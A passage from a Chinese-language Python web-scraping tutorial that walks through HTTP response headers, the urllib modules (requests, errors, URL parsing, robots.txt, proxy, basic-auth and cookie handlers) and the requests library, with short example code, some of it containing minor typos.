href="https://juejin.cn/post/6844904202863394830">HTTP 状态码 - 掘金 (juejin.cn)</a></p><h4 id="response-header"><a class="markdownIt-Anchor" href="#response-header"></a> <strong>response-header</strong></h4><blockquote><p>Data: 标识响应产生的时间</p><p>Last-Modified: 指定资源的最后修改时间</p><p>Content-Encoding: 指定响应内容的编码</p><p>Server: 包含服务器的信息，例如名称和版本号</p><p>Content-Type: 文档类型，指定返回的数据是什么类型text/html:html文档，application/x-javascript返回javascript类型，image/jpeg返回图片</p><p>Set-Cookie:设置Cookie,告诉浏览器需要将此内容放在Cooki中</p><p>Expires:用于指定响应的过期时间</p></blockquote><h4 id="response-body"><a class="markdownIt-Anchor" href="#response-body"></a> <strong>response-body</strong></h4><p>即响应的正文数据，是我们需要爬取的内容如图下3281</p><h2 id="urllib"><a class="markdownIt-Anchor" href="#urllib"></a> <strong>urllib</strong></h2><p>llib 包 包含以下几个模块：</p><ul><li><strong>urllib.request</strong> - <strong>打开和读取 URL</strong>。</li><li>urllib.error - 包含 urllib.request 抛出的异常。</li><li><strong>urllib.parse</strong> - <strong>解析 URL</strong>。</li><li>urllib.robotparser - 解析 robots.txt 文件。</li></ul><h3 id="urllibrequest"><a class="markdownIt-Anchor" href="#urllibrequest"></a> <strong>urllib.request</strong></h3><blockquote><pre class="line-numbers language-none"><code class="language-none">urllib.request.urlopen(url, data&#x3D;None, [timeout, ]*, cafile&#x3D;None, capath&#x3D;None, cadefault&#x3D;False, context&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>url</strong>：url 地址。</li><li><strong>data</strong>：发送到服务器的其他数据对象，默认为 None。</li><li><strong>timeout</strong>：设置访问超时时间。</li><li><strong>cafile 和 capath</strong>：cafile 为 CA 证书， capath 为 CA 证书的路径，使用 HTTPS 需要用到。</li><li><strong>cadefault</strong>：已经被弃用。</li><li><strong>context</strong>：ssl.SSLContext类型，用来指定 SSL 设置。</li></ul></blockquote><p>模拟网页打开</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token comment">#打开一个网页，并返回网页源码</span>response<span class="token punctuation">.</span>status <span class="token comment">#返回网页响应状态码</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#返回网页的响应头信息</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token comment">#返回响应头信息'Server'的信息</span><span class="token comment">#headers可获取的值是响应头的所有元素,eg:Content-Type:指定服务器返回的响应内容类型。</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment">#输出utf8编码的源代码</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token comment">#指定输出的长度</span>response<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取一行内容</span>response<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取全部内容，返回一个列表，每一行是列表的元素</span>encoded_url<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token comment">#编码，unquote就是url解码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模拟头部信息则需要urllib.request.Request类</p><blockquote><pre class="line-numbers language-none"><code class="language-none">class urllib.request.Request(url, data&#x3D;None, headers&#x3D;&#123;&#125;, origin_req_host&#x3D;None, unverifiable&#x3D;False, method&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>url</strong>：url 地址。</li><li><strong>data</strong>：发送到服务器的其他数据对象，默认为 None。</li><li><strong>headers</strong>：HTTP 请求的头部信息，字典格式。</li><li><strong>origin_req_host</strong>：请求的主机地址，IP 或域名。</li><li><strong>unverifiable</strong>：很少用整个参数，用于设置网页是否需要验证，默认是False。。</li><li><strong>method</strong>：请求方法， 如 GET、POST、DELETE、PUT等。</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseheader <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'</span><span class="token punctuation">&#125;</span>   <span class="token comment">#头部信息</span>url<span class="token operator">=</span><span class="token string">'www.baidu.com/?s='</span>keyword<span class="token operator">=</span><span class="token string">'Python教程'</span>url_all<span class="token operator">=</span>url<span class="token operator">+</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url_all<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token comment">#构造请求头</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#输出响应体</span>url <span class="token operator">=</span> <span class="token string">'https://www.runoob.com/try/py3/py3_urllib_test.php'</span>  <span class="token comment"># 提交到表单页面</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'RUNOOB'</span><span class="token punctuation">,</span> <span class="token string">'tag'</span> <span class="token punctuation">:</span> <span class="token string">'菜鸟教程'</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 提交数据</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>header，method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token comment">#请求处理</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#输出响应体</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'wwww'</span><span class="token punctuation">)</span><span class="token comment">#添加文件头</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="urlliberror"><a class="markdownIt-Anchor" href="#urlliberror"></a> <strong>urllib.error</strong></h3><p>urllib.error 模块为 urllib.request 所引发的异常定义了异常类，基础异常类是 URLError。</p><p>urllib.error 包含了两个方法，URLError 和 HTTPError。</p><p>URLError 是 OSError 的一个子类，用于处理程序在遇到问题时会引发此异常（或其派生的异常），包含的属性 reason 为引发异常的原因。</p><p>HTTPError 是 URLError 的一个子类，用于处理特殊 HTTP 错误例如作为认证请求的时候，包含的属性 code 为 HTTP 的状态码， reason 为引发异常的原因，headers 为导致 HTTPError 的特定 HTTP 请求的 HTTP 响应头。</p><p>对不存在的网页抓取并处理异常:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>errormyurl<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'www.baidu.com/404.html'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    myurl2<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>myurl<span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">if</span> e<span class="token punctuation">.</span>code<span class="token operator">==</span><span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="urllibparse"><a class="markdownIt-Anchor" href="#urllibparse"></a> <strong>urllib.parse</strong></h3><p>解析url</p><blockquote><p>urllib.parse.urlparse(urlstring, scheme=‘’, allow_fragments=True)</p><ul><li>urlstring:url地址</li><li>scheme:协议类型</li><li>allow_fragments: 是否忽略fragment</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparseo <span class="token operator">=</span> urlparse<span class="token punctuation">(</span><span class="token string">"https://www.runoob.com/?s=python+%E6%95%99%E7%A8%8B"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token comment">#ParseResult(scheme='https', netloc='www.runoob.com', path='/', params='', query='s=python+%E6%95%99%E7%A8%8B', fragment='')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>urllib.parse.urlunparse:用于构造url</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsedata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'https'</span><span class="token punctuation">,</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">,</span><span class="token string">'index.html'</span><span class="token punctuation">,</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token string">'a=6'</span><span class="token punctuation">,</span><span class="token string">'comment'</span><span class="token punctuation">]</span>urllib<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">#https://www.baidu.com/index.html;user?a=6#comment</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>urllib.parse.urlsplit:类型与urlparse 不过不单独解析params，合并到path</p></li><li><p>urllib.parse.urljoin:提供一个base_url作为第一个参数，将新的连接作为第二个参数，urljoin会分析base_url的scheme,netloc,path三个内容，对新连接确实的部分进行补充，然后返回结果</p><p>baseurl提供scheme,netloc,path若新连接不存在这三项，则补充，否则使用新链接的</p></li><li><p>urllib.parse.encode:构造get请求</p></li><li><p>urllib.parse.parse_qs 反序列化</p></li><li><p>urllib.parse.parse_qsl  参数转元组组成的列表</p></li><li><p>urllib.parse.quote 转化url编码格式</p></li><li><p>urllib.parse.unquote(url)  将url解码</p></li></ul><h3 id="urllibrobotparser"><a class="markdownIt-Anchor" href="#urllibrobotparser"></a> <strong>urllib.robotparser</strong></h3><p>不常用</p><blockquote><p>class urllib.robotparser.RobotFileParser(url=‘’)</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> urllib<span class="token punctuation">.</span>robotparser<span class="token operator">>></span><span class="token operator">></span> rp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>robotparser<span class="token punctuation">.</span>RobotFileParser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>set_url<span class="token punctuation">(</span><span class="token string">"http://www.musi-cal.com/robots.txt"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rrate <span class="token operator">=</span> rp<span class="token punctuation">.</span>request_rate<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rrate<span class="token punctuation">.</span>requests<span class="token number">3</span><span class="token operator">>></span><span class="token operator">></span> rrate<span class="token punctuation">.</span>seconds<span class="token number">20</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>crawl_delay<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token number">6</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"http://www.musi-cal.com/cgi-bin/search?city=San+Francisco"</span><span class="token punctuation">)</span><span class="token boolean">False</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"http://www.musi-cal.com/"</span><span class="token punctuation">)</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="handler"><a class="markdownIt-Anchor" href="#handler"></a> <strong>handler</strong></h3><p>19758</p><p>19815</p><ul><li><p>设置代理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLError<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> ProxyHandler<span class="token punctuation">,</span>build_opener<span class="token comment">#Request相当于一个特殊的opener类</span>proxy_handler<span class="token operator">=</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">,</span>    <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'https://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>opener<span class="token operator">=</span>build_opener<span class="token punctuation">(</span>proxy_handler<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">)</span>   <span class="token comment">#opener提供open方法，与urlopen如出一辙</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span> <span class="token comment">#打印httperror的状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>身份验证</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">,</span>HTTPBasicAuthHandler<span class="token punctuation">,</span>build_opener<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span>  URLErrorusername<span class="token operator">=</span><span class="token string">'admin'</span>password<span class="token operator">=</span><span class="token string">'admin'</span>url<span class="token operator">=</span><span class="token string">'https://ssr3.scrape.center/'</span>p<span class="token operator">=</span>HTTPPasswordMgrWithDefaultRealm<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>add_password<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token comment">#账户对象</span>auth_handler<span class="token operator">=</span>HTTPBasicAuthHandler<span class="token punctuation">(</span>p<span class="token punctuation">)</span>opener<span class="token operator">=</span>build_opener<span class="token punctuation">(</span>auth_handler<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    result<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>    html<span class="token operator">=</span>result<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token keyword">except</span> URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置Cookie</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> http<span class="token punctuation">.</span>cookiejar<span class="token punctuation">,</span>urllib<span class="token punctuation">.</span>requestcookie <span class="token operator">=</span> http<span class="token punctuation">.</span>cookiejar<span class="token punctuation">.</span>CookieJar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#声明一个CookieJar对象</span>handler <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>HTTPCookieProcessor<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span>opener<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span>handler<span class="token punctuation">)</span>response<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> cookie<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>item<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="requests"><a class="markdownIt-Anchor" href="#requests"></a> <strong>requests</strong></h2><p>对比起urllib库实则是方便太多了，但是urllib是标准库捏,还是要学一下</p><p>,所有数据体返回体基本都是json格式</p><ul><li><p>解析json</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/get"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回值：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;class 'str'>&#123;'args': &#123;&#125;, 'headers': &#123;'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.18.4'&#125;, 'origin': '183.64.61.29', 'url': 'http://httpbin.org/get'&#125;&#123;'args': &#123;&#125;, 'headers': &#123;'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Host': 'httpbin.org', 'User-Agent': 'python-requests/2.18.4'&#125;, 'origin': '183.64.61.29', 'url': 'http://httpbin.org/get'&#125;&lt;class 'dict'><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>抓数据</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span><span class="token comment">#实现GET请求 同理.put .post .delete .patch实现其他请求</span><span class="token comment">#get请求添加额外信息</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'germey'</span>    <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">&#125;</span><span class="token comment">#传入的数据是json格式的</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">,</span>params<span class="token operator">=</span>date<span class="token punctuation">)</span><span class="token comment">#网页返回的类型是str类型且是json格式的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo:爬取所有电影名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requests<span class="token keyword">import</span> rer<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://ssr1.scrape.center/'</span><span class="token punctuation">)</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;h2.*?>(.*?)&lt;/h2>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>demo2:抓取二进制数据，一半用于爬取图片，以及视频</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsr<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://scrape.center/favicon.ico'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token comment">#图片的二进制流转为str类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment">#返回bytes类型的数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>添加请求头</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'???'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>响应</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>status_code<span class="token comment">#状态码</span>r<span class="token punctuation">.</span>headers <span class="token comment">#响应头</span>r<span class="token punctuation">.</span>cookies <span class="token comment">#cookie</span>r<span class="token punctuation">.</span>url <span class="token comment">#url</span>r<span class="token punctuation">.</span>histroy <span class="token comment">#请求历史</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>文件上传</li></ul><p>模拟上传文件</p><p>demo:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsfiles<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'favicon.ico'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/post'</span><span class="token punctuation">,</span><span class="token builtin">file</span><span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#返回上传文件后的响应</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>设置Cookies</li></ul><p>只需要在headers的字典中添加’Cookie’：'xxx’即可</p><ul><li>维持Seesion</li></ul><p>不设置Seesion就相当于两次爬取打开两个浏览器，Cookie就无法保持</p><p>设置了一个Seesion，可以提高爬取速度而且维持Cookies</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#创建一个Session对象</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://httpbin.org/cookies/set/sessioncookie/123456789'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://httpbin.org/cookies'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>content和r<span class="token punctuation">.</span>text都是requests库中Response对象的属性，用于获取请求的响应内容，但它们之间有一些重要的区别：类型：r<span class="token punctuation">.</span>content返回的是以字节形式表示的响应内容，即<span class="token builtin">bytes</span>类型的对象。r<span class="token punctuation">.</span>text返回的是以Unicode形式表示的响应内容，即<span class="token builtin">str</span>类型的对象。编码：r<span class="token punctuation">.</span>content返回的是原始的字节数据，没有进行任何编码，因此它适用于处理图片、音频、视频等二进制数据。r<span class="token punctuation">.</span>text返回的是根据HTTP响应中的字符编码自动解码后的文本数据，通常是UTF<span class="token operator">-</span><span class="token number">8</span>编码。如果无法确定编码方式，requests库会根据HTTP头部中的字符编码来猜测，或者使用默认的UTF<span class="token operator">-</span><span class="token number">8</span>编码。用途：当需要处理文本内容时，如HTML页面或JSON数据等，通常使用r<span class="token punctuation">.</span>text，因为它提供了方便的文本操作方法，比如字符串查找、分割等。当需要处理二进制数据时，如图片、视频、文件等，通常使用r<span class="token punctuation">.</span>content，因为它返回的是原始的字节数据，不会对数据进行额外的解析或处理。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>超时设置</p><p>访问有些网站时可能会超时，这时设置好timeout就可以解决这个问题</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">import requestsfrom requests.exceptions import ReadTimeouttry: response = requests.get("http://httpbin.org/get", timeout = 0.5) print(response.status_code)except ReadTimeout: print('Timeout')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正常访问，状态吗返回200</p></li><li><p>异常处理</p></li></ul><p>​遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个ConnectionError 异常。</p><p>​遇到罕见的无效HTTP响应时，Requests则会抛出一个 HTTPError 异常。</p><p>​若请求超时，则抛出一个 Timeout 异常。</p><p>​若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。</p><p>所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。</p><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> 